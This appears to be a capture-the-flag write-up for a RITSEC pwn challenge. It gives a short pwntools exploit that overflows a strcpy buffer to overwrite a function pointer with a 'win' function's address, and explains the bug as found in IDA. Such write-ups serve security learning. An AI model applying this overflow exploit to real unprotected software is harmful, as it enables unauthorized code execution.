# The Gumponent
PWN - 100 points.

```python
from pwn import *

#p = process("./test_gumponent")
p = remote("ctf.ritsec.club", 31746)

payload = b"A"*32

#win function addr
payload += p64(0x401230)

p.sendline(payload)

p.interactive()
```
Open the binary in IDA Free:

![image](https://github.com/RPISEC/Writeups/assets/29514104/eeb4cac3-c5a5-456d-b54d-60253defe317)

`dest` and `v5` will set next to each other in memory. The `strcopy` function allows us to write more bytes to `dest` than it can actually hold.

Therefore, we can overwrite `v5`, which is a function pointer. 

Looking through the functions, we find a "win" function.

![image](https://github.com/RPISEC/Writeups/assets/29514104/9035bd5a-d461-474a-b34a-afa8ba31d24f)

I rename the function so its easier to find and find its address through the "Functions" subview after placing a breakpoint at the top of main and running:

![image](https://github.com/RPISEC/Writeups/assets/29514104/3a47b34f-20bd-4885-9206-4e104f03e0e0)

We can use this function address directly because our binary has no protections:

![image](https://github.com/RPISEC/Writeups/assets/29514104/b136b587-b165-4214-9e05-9ba04d05c9fd)
